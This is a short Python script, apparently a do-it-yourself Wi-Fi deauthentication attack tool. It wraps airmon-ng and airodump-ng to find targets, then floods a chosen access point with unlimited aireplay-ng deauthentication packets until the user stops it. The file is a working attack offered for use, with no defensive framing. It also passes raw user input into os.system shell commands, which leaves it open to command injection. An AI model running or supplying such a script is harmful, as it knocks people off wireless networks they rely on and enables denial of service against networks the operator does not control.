#!\usr\bin\env python

import os
from scapy.all import *
import timeit


print("Enter the scan interface")
scanInterface=input()
os.system("sudo airmon-ng start "+scanInterface)
os.system("sudo xterm -e airodump-ng "+scanInterface+" &" )
#& is to throw in background
attackInterface=input("Enter Attack Interface")
ar='s'
#ar=input(s)
#aa='x'
#aa=input(x)


ap=input("Enter Ap MAC ID")
print("Setting channel please enter a channel EX:1")
ch=input()


while(ar=='s'):
	ar=input("press s to continue or x to stop")
	
	#if(ar=='s'):
	os.system("sudo iwconfig  "+attackInterface+" channel "+ch)
	os.system("sudo  aireplay-ng --deauth 0 -a "+ap+" "+attackInterface)
		
	if(ar=='x'):
		break;
